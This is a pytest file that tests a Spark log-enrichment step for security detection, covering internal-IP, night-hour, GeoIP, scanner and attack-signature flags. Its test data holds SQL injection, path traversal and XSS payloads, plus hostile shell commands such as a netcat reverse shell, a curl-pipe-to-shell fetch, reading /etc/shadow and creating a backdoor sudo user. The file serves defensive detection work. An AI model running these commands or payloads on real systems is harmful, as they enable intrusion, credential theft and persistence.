"""enrich: RFC1918 detection, night-hours boundaries, prefix GeoIP join."""

import pytest

from transform.enrich import build_geoip_lookup, cheap_enrich, join_enrich


def _enrich(spark, rows, **context):
    """rows: (ip, ts). context: v2 columns applied to every row."""
    from pyspark.sql import functions as F

    df = spark.createDataFrame(rows, "source_ip string, ts string").selectExpr(
        "source_ip", "cast(ts as timestamp) as timestamp"
    )
    defaults = {"url_path": "", "user_agent": "", "command": "", "file_path": "",
                "http_status": 0, "process_uid": -1}
    defaults.update(context)
    for name, value in defaults.items():
        df = df.withColumn(name, F.lit(value))
    return {
        r.source_ip: r
        for r in join_enrich(cheap_enrich(df), build_geoip_lookup(spark)).collect()
    }


@pytest.mark.parametrize(
    "ip, internal",
    [
        ("192.168.1.47", 1),
        ("10.0.20.5", 1),
        ("172.16.5.4", 1),
        ("172.31.0.1", 1),
        ("172.1.5.4", 0),  # NOT 172.16/12 -- the regex must not over-match
        ("172.32.0.1", 0),
        ("127.0.0.1", 1),
        ("185.23.44.12", 0),
    ],
)
def test_internal_ip_detection(spark, ip, internal):
    rows = _enrich(spark, [(ip, "2026-09-20 12:00:00")])
    assert rows[ip].is_internal_ip == internal


@pytest.mark.parametrize(
    "hour, night",
    [(21, 0), (22, 1), (23, 1), (0, 1), (5, 1), (6, 0), (12, 0)],
)
def test_night_boundaries(spark, hour, night):
    rows = _enrich(spark, [("10.0.0.1", f"2026-09-20 {hour:02d}:30:00")])
    assert rows["10.0.0.1"].is_night == night


def test_geo_is_resolved_by_prefix_not_exact_ip(spark):
    rows = _enrich(
        spark,
        [
            ("102.67.17.55", "2026-09-20 12:00:00"),  # never listed exactly
            ("185.23.44.12", "2026-09-20 12:00:00"),
            ("192.168.1.9", "2026-09-20 12:00:00"),
        ],
    )
    assert rows["102.67.17.55"].country_code == "ZA"
    assert rows["185.23.44.12"].country_code == "RU"
    assert rows["192.168.1.9"].country_code == "--"


def test_unknown_ip_is_kept_with_empty_country(spark):
    # left join: an IP missing from the lookup is exactly what to keep
    rows = _enrich(spark, [("8.8.8.8", "2026-09-20 12:00:00")])
    assert rows["8.8.8.8"].country_code == ""


def _one(spark, **context):
    return list(_enrich(spark, [("185.23.44.12", "2026-09-20 12:00:00")], **context).values())[0]


@pytest.mark.parametrize(
    "path, label",
    [
        ("/api/v1/products?id=42' OR '1'='1", "sqli"),
        ("/api/v1/products?id=42 UNION SELECT username,password FROM users--", "sqli"),
        ("/api/v1/products?id=42%27%20OR%201%3D1--", "sqli"),
        ("/static/../../../../etc/passwd", "path_traversal"),
        ("/static/%2e%2e/%2e%2e/etc/passwd", "path_traversal"),
        ("/search?q=<script>alert(1)</script>", "xss"),
        ("/api/v1/products?id=42", ""),
        ("/dashboard", ""),
    ],
)
def test_request_signatures(spark, path, label):
    row = _one(spark, url_path=path)
    assert row.request_signature == label
    assert row.is_attack_signature == (1 if label else 0)


def test_scanner_agent_vs_real_browser(spark):
    assert _one(spark, user_agent="sqlmap/1.8.2#stable").is_scanner_agent == 1
    assert _one(spark, user_agent="Mozilla/5.0 (X11; Linux x86_64) Firefox/141.0").is_scanner_agent == 0


@pytest.mark.parametrize(
    "command, sensitive",
    [
        ("cat /etc/shadow", 1),
        ("nc -e /bin/sh 185.23.44.12 4444", 1),
        ("useradd -m -G sudo backdoor", 1),
        ("history -c", 1),
        ("curl http://x/y.sh | sh", 1),
        # routine automation, some of it as root in real life
        ("rsync -a /srv/data /backup/data", 0),
        ("curl -s http://localhost/healthz", 0),
        ("kubectl rollout status deploy/app", 0),
    ],
)
def test_sensitive_commands(spark, command, sensitive):
    assert _one(spark, command=command).is_sensitive_command == sensitive


def test_reading_shadow_counts_even_without_a_command(spark):
    assert _one(spark, file_path="/etc/shadow").is_sensitive_command == 1


def test_privileged_only_for_a_known_root_uid(spark):
    assert _one(spark, process_uid=0).is_privileged == 1
    assert _one(spark, process_uid=-1).is_privileged == 0   # unknown is not root
